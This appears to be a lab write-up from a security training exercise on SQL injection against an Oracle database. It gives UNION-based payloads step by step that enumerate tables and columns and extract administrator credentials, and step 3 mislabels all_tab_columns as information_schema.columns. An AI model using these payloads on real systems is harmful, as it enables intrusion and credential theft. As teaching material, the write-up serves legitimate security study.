<img width="500" height="351" alt="Screenshot_15" src="https://github.com/user-attachments/assets/0adae7c5-91eb-42b0-8319-5556a5ee550c" /> 
<img width="400" height="350" alt="Screenshot_14" src="https://github.com/user-attachments/assets/c4db386e-182e-48cc-924b-578bdc5a2e72" />
<img width="400" height="351" alt="Screenshot_13" src="https://github.com/user-attachments/assets/e8ed0cfb-d623-48c1-bc13-32e5b8d90bf3" />
<img width="300" height="200" alt="Screenshot_12" src="https://github.com/user-attachments/assets/ea06ffe9-a857-4bcf-b209-fbdc0a423c41" />
<img width="400" height="351" alt="Screenshot_11" src="https://github.com/user-attachments/assets/17029d53-6033-45a6-8787-a89356280924" />
<img width="500" height="351" alt="Screenshot_10" src="https://github.com/user-attachments/assets/0a928f80-0964-45b9-add2-a1a31335cae3" />

# Lab: SQL Injection Attack – Listing the Database Contents (Oracle)

## 📝 Lab Summary
This lab demonstrates how to exploit a **SQL injection vulnerability** against an **Oracle database**.  
The objective is to enumerate schema information using Oracle-specific system tables and retrieve the administrator’s username and password.

---

## 🔑 Key Concepts Used
- Oracle requires selecting from the **`dual`** table when testing with static values.
- Schema enumeration is performed via:
  - `all_tables` → lists all tables
  - `all_tab_columns` → lists all columns of a given table
- Extracting sensitive data directly from the target table.

---

## 🚀 Step-by-Step Exploitation

### 1. Determine the number of columns
Instead of `null` values (used in non-Oracle DBs), Oracle needs strings plus the `dual` table:
' UNION SELECT 'abc', 'def' FROM dual--
 If successful → confirms 2 columns in the original query.
### 2. Enumerate all available tables
Use all_tables to discover schema contents:
- ' UNION SELECT table_name, 'def' FROM all_tables--
Scan the output for a table of interest, usually named USERS.
### 3. Enumerate columns of the chosen table
Query information_schema.columns for the users table:
' UNION SELECT column_name, 'def' 
  FROM all_tab_columns 
  WHERE table_name='USERS'--
##### Typical results:
- username
- password
### 4. Extract usernames and passwords
' UNION SELECT username, password FROM users--
Among the results, locate the administrator credentials.
### 5. Use credentials to log in
Take the extracted administrator username and password, then authenticate through the application’s login page.




